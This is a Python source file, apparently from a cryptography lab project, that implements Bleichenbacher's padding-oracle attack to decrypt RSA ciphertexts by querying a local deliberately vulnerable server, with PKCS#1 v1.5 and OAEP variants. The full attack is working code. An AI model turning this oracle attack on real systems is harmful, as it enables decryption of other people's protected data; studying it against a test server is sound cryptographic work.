import logging
import sys
import time
from pathlib import Path
from random import randint
from gmpy2 import powmod

PROJECT_ROOT = Path(__file__).resolve().parent.parent
if str(PROJECT_ROOT) not in sys.path:
    sys.path.insert(0, str(PROJECT_ROOT))

from src.vunerable_server import VunerableServer
from src import decode_OAEP

logging.basicConfig(
    level=logging.INFO,
    format="%(asctime)s [%(levelname)s] %(message)s",
    datefmt="%H:%M:%S",
)
log = logging.getLogger("bb_attack")


def ceildiv(a, b):
    return -(-a // b)

def floordiv(a, b):
    return a // b


class BleichenbacherAttack:
    def __init__(self, server: VunerableServer, attack_type="PKCS1_v1_5"):
        self.server = server
        self.attack_type = attack_type
        if self.attack_type not in ["PKCS1_v1_5", "OAEP"]:
            self.attack_type = "arbitrary"  # default to arbitrary if invalid type is provided
        if self.attack_type == "PKCS1_v1_5":
            self.secret_ciphertext = self.server.get_secret_ciphertext()
        elif self.attack_type == "OAEP":
            self.secret_ciphertext = self.server.get_arbitrary_ciphertext_OAEP()
        else:  # arbitrary
            self.secret_ciphertext = self.server.get_arbitrary_ciphertext()

        if isinstance(self.secret_ciphertext, bytes):
            self.secret_ciphertext = int.from_bytes(self.secret_ciphertext, "big")
        self.modulus, self.exponent = self.server.get_public_key()
        self.modulus_bytes = (self.modulus.bit_length() + 7) // 8

        self.iterations = 0
        self.blinding_factor = None
        self.blinding_ciphertext = None
        self.searching_factor = None
        self.bound = None
        self.intervals = []
        self.solution = None

        self.oracle_calls = 0        # total queries, for a final report
        self._start_time = None
        self._search_calls = [0, 0, 0]

    """Check if a given ciphertext is PKCS#1 conforming using the oracle."""
    def oracle_check(self, ciphertext):
        self.oracle_calls += 1
        if isinstance(ciphertext, bytes):
            ciphertext_bytes = ciphertext
        else:
            ciphertext_bytes = int(ciphertext).to_bytes(self.modulus_bytes, "big")
        return self.server.is_PKCS_conforming(ciphertext_bytes)

    """(AI) Helper method to log the current progress of the attack."""
    def _log_progress(self, label):
        a, b = self.intervals[0]
        width_bits = (b - a).bit_length()
        elapsed = time.time() - self._start_time
        log.info(
            "[%s] iter=%d intervals=%d width≈2^%d calls=%d elapsed=%.1fs",
            label, self.iterations, len(self.intervals), width_bits,
            self.oracle_calls, elapsed,
        )

    """Main method to execute the Bleichenbacher attack."""
    def attack(self):
        self._start_time = time.time()
        log.info("Starting attack: n=%d bits, k=%d bytes", self.modulus.bit_length(), self.modulus_bytes)

        # Step 1
        self.find_blinding_factor()
        log.info("Step 1 done: blinding_factor=%d (calls=%d)", self.blinding_factor, self.oracle_calls)

        while self.solution is None:
            # Step 2
            if self.iterations == 1:
                self.initialize_search()
                self._log_progress("2a")
            elif self.iterations > 1 and len(self.intervals) > 1:
                self.search_intervals()
                self._log_progress("2b")
            else:
                self.search_interval()
                self._log_progress("2c")

            # Step 3
            self.narrow_solutions()
            if not self.intervals:
                raise RuntimeError("Interval set became empty — check oracle/bound definitions")

            if len(self.intervals) == 1 and self.intervals[0][0] == self.intervals[0][1]:
                # Step 4
                self.compute_solution()

            self.iterations += 1

        elapsed = time.time() - self._start_time
        log.info("Solved in %.1fs, %d iterations, %d oracle calls", elapsed, self.iterations, self.oracle_calls)
        return self.solution

    """Step 4: Computing the solution once the interval is narrowed down to a single value."""
    def compute_solution(self):
        a = self.intervals[0][0]
        inv_blinding_factor = powmod(self.blinding_factor, -1, self.modulus)
        m = int((a * inv_blinding_factor) % self.modulus)
        encryption_block = m.to_bytes(self.modulus_bytes, "big")

        if self.attack_type == "PKCS1_v1_5":
            if not (encryption_block[0] == 0x00 and encryption_block[1] == 0x02):
                raise ValueError("Invalid PKCS#1 padding.")
            separator_index = encryption_block.find(b"\x00", 2)
            if separator_index == -1:
                raise ValueError("Invalid PKCS#1 padding.")
            self.solution = encryption_block[separator_index + 1:]
        elif self.attack_type == "OAEP":
            self.solution = decode_OAEP.oaep_decode(encryption_block, self.modulus_bytes)
        else:  # arbitrary
            self.solution = encryption_block.lstrip(b"\x00") or b"\x00"

    """(AI) Step 3: Narrowing the set of solutions."""
    def narrow_solutions(self):
        new_intervals = []
        for a, b in self.intervals:
            r_lower = ceildiv((a * self.searching_factor - 3 * self.bound + 1), self.modulus)
            r_upper = floordiv((b * self.searching_factor - 2 * self.bound), self.modulus)
            for r in range(r_lower, r_upper + 1):
                new_a = max(a, ceildiv((2 * self.bound + r * self.modulus), self.searching_factor))
                new_b = min(b, floordiv((3 * self.bound - 1 + r * self.modulus), self.searching_factor))
                if new_a <= new_b:
                    new_intervals.append((new_a, new_b))
        self.intervals = new_intervals

    """(AI) Step 2.c: Searching within a single interval."""
    def search_interval(self):
        self._search_calls[2] += 1
        a, b = self.intervals[0]
        r = ceildiv(2 * (b * self.searching_factor - 2 * self.bound), self.modulus)
        checkpoint = self.oracle_calls
        while True:
            s_lower = ceildiv(2 * self.bound + r * self.modulus, b)
            s_upper = floordiv(3 * self.bound - 1 + r * self.modulus, a)
            for s in range(s_lower, s_upper + 1):
                candidate = (self.blinding_ciphertext * powmod(s, self.exponent, self.modulus)) % self.modulus
                if self.oracle_check(candidate):
                    self.searching_factor = s
                    return
                if self.oracle_calls - checkpoint >= 5000:
                    log.debug("2c heartbeat: r=%d s=%d calls_this_step=%d", r, s, self.oracle_calls - checkpoint)
                    checkpoint = self.oracle_calls
            r += 1

    """Step 2.b: Searching for the next valid multiplier."""
    def search_intervals(self):
        self._search_calls[1] += 1
        self.searching_factor += 1
        checkpoint = self.oracle_calls
        while True:
            candidate = (self.blinding_ciphertext * powmod(self.searching_factor, self.exponent, self.modulus)) % self.modulus
            if self.oracle_check(candidate):
                return
            self.searching_factor += 1
            if self.oracle_calls - checkpoint >= 5000:
                log.debug("2b heartbeat: s=%d calls_this_step=%d", self.searching_factor, self.oracle_calls - checkpoint)
                checkpoint = self.oracle_calls

    """Step 2.a: Initializing the search for a valid multiplier."""
    def initialize_search(self):
        self._search_calls[0] += 1
        self.searching_factor = ceildiv(self.modulus, (3 * self.bound))
        checkpoint = self.oracle_calls
        while True:
            candidate = (self.blinding_ciphertext * powmod(self.searching_factor, self.exponent, self.modulus)) % self.modulus
            if self.oracle_check(candidate):
                return
            self.searching_factor += 1
            if self.oracle_calls - checkpoint >= 5000:
                log.debug("2a heartbeat: s=%d calls_this_step=%d", self.searching_factor, self.oracle_calls - checkpoint)
                checkpoint = self.oracle_calls

    """Step 1: Finding a blinding factor."""
    def find_blinding_factor(self):
        self.blinding_factor = 1
        candidate = None
        while True:
            candidate = (self.secret_ciphertext * powmod(self.blinding_factor, self.exponent, self.modulus)) % self.modulus
            if self.oracle_check(candidate):
                break
            self.blinding_factor = randint(1, self.modulus - 1)

        self.bound = 1 << (8 * (self.modulus_bytes - 2))
        self.blinding_ciphertext = candidate
        self.intervals.append((2 * self.bound, 3 * self.bound - 1))
        self.iterations += 1